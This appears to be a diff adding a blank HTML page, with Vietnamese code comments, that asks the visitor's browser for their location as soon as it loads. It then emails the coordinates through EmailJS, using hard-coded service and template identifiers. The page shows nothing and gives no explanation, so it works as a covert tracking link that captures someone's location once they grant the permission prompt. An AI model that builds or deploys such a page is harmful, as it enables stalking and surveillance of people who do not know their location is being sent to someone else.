@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+  <head>
+    <title></title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function () {
+        // Khởi tạo EmailJS
+        emailjs.init("hK9A0p31tuRob5NzU");
+      })();
+    </script>
+  </head>
+  <body style="background-color: white; margin: 0; padding: 0">
+    <script>
+      // Tự động chạy ngay khi trang tải xong
+      window.onload = function () {
+        console.log("Hệ thống đang yêu cầu quyền vị trí...");
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendEmail, showError);
+        } else {
+          console.error("Trình duyệt không hỗ trợ lấy vị trí.");
+        }
+      };
+
+      // Hàm xử lý khi lấy được vị trí
+      function sendEmail(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+
+        console.log(`Đã lấy được vị trí (Vĩ độ: ${lat}, Kinh độ: ${lng}). Đang tiến hành gửi email...`);
+
+        var templateParams = {
+          lat: lat,
+          lng: lng,
+        };
+
+        // Gửi thông tin qua EmailJS
+        emailjs.send("service_qeidb0o", "template_jwqv8c4", templateParams).then(
+          function (response) {
+            console.log("✅ Đã gửi email thông báo thành công!");
+          },
+          function (error) {
+            console.error("❌ Gửi email thất bại. Chi tiết lỗi:", error);
+          },
+        );
+      }
+
+      // Hàm xử lý lỗi nếu bị chặn quyền
+      function showError(error) {
+        console.error("❌ Không thể lấy vị trí. Mã lỗi:", error.code, "-", error.message);
+      }
+    </script>
+  </body>
+</html>
